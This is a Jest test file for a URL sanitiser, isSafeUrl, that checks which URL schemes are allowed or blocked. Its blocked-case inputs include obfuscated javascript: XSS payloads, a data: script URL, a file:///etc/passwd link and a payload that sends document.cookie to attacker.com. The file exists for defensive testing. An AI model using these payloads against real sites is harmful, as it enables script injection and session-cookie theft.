import { isSafeUrl } from './isSafeUrl';

describe('isSafeUrl', () => {
  test('Should allow http URL', () => {
    expect(isSafeUrl('http://example.com')).toBe(true);
  });

  test('Should allow https URL', () => {
    expect(isSafeUrl('https://example.com')).toBe(true);
  });

  test('Should allow https URL with leading whitespace', () => {
    expect(isSafeUrl('  https://example.com')).toBe(true);
  });

  test('Should allow https URL with path, query, and fragment', () => {
    expect(isSafeUrl('https://example.com/path?q=1#section')).toBe(true);
  });

  test('Should allow relative path', () => {
    expect(isSafeUrl('/dashboard')).toBe(true);
  });

  test('Should allow relative path without leading slash', () => {
    expect(isSafeUrl('dashboard/overview')).toBe(true);
  });

  test('Should allow fragment-only URL', () => {
    expect(isSafeUrl('#section')).toBe(true);
  });

  test('Should allow query-only URL', () => {
    expect(isSafeUrl('?page=2')).toBe(true);
  });

  test('Should allow empty string', () => {
    expect(isSafeUrl('')).toBe(true);
  });

  test('Should block javascript: protocol', () => {
    // eslint-disable-next-line no-script-url
    expect(isSafeUrl('javascript:alert(1)')).toBe(false);
  });

  test('Should block javascript: protocol with leading whitespace', () => {
    // eslint-disable-next-line no-script-url
    expect(isSafeUrl(' javascript:alert(1)')).toBe(false);
  });

  test('Should block javascript: protocol with leading tabs/newlines', () => {
    // eslint-disable-next-line no-script-url
    expect(isSafeUrl('\n\tjavascript:alert(1)')).toBe(false);
  });

  test('Should block javascript: protocol with embedded newline in scheme', () => {
    // eslint-disable-next-line no-script-url
    expect(isSafeUrl('java\nscript:alert(1)')).toBe(false);
  });

  test('Should block javascript: protocol with embedded tab in scheme', () => {
    // eslint-disable-next-line no-script-url
    expect(isSafeUrl('java\tscript:alert(1)')).toBe(false);
  });

  test('Should block data: protocol', () => {
    expect(isSafeUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
  });

  test('Should block vbscript: protocol', () => {
    expect(isSafeUrl('vbscript:msgbox("xss")')).toBe(false);
  });

  test('Should block vbscript:alert(1)', () => {
    expect(isSafeUrl('vbscript:alert(1)')).toBe(false);
  });

  test('Should block javascript: protocol with null byte prefix', () => {
    // eslint-disable-next-line no-script-url
    expect(isSafeUrl('\0javascript:alert(1)')).toBe(false);
  });

  test('Should block mixed-case javascript: protocol with embedded newline', () => {
    // eslint-disable-next-line no-script-url
    expect(isSafeUrl('JaVa\nScRiPt:alert(1)')).toBe(false);
  });

  test('Should block javascript: protocol with CRLF prefix', () => {
    // eslint-disable-next-line no-script-url
    expect(isSafeUrl('\r\njavascript:alert(1)')).toBe(false);
  });

  test('Should block javascript payload from security report', () => {
    // eslint-disable-next-line no-script-url
    expect(isSafeUrl("javascript:fetch('https://attacker.com/'+document.cookie)")).toBe(false);
  });

  test('Should block javascript protocol with leading invisible separator', () => {
    // eslint-disable-next-line no-script-url
    expect(isSafeUrl('\u2060javascript:alert(1)')).toBe(false);
  });

  test('Should block file: protocol', () => {
    expect(isSafeUrl('file:///etc/passwd')).toBe(false);
  });

  test('Should allow ftp: protocol', () => {
    expect(isSafeUrl('ftp://example.com/file')).toBe(true);
  });

  test('Should allow mailto: protocol', () => {
    expect(isSafeUrl('mailto:user@example.com')).toBe(true);
  });

  test('Should allow tel: protocol', () => {
    expect(isSafeUrl('tel:+1234567890')).toBe(true);
  });

  test('Should block custom: protocol', () => {
    expect(isSafeUrl('custom:payload')).toBe(false);
  });

  test('Should block custom: protocol with leading whitespace', () => {
    expect(isSafeUrl(' custom:payload')).toBe(false);
  });

  test('Should allow a path that contains a colon but is not a scheme', () => {
    expect(isSafeUrl('/path/to:resource')).toBe(true);
  });

  test('Should allow a path starting with a digit before colon', () => {
    expect(isSafeUrl('123:not-a-scheme')).toBe(true);
  });
});
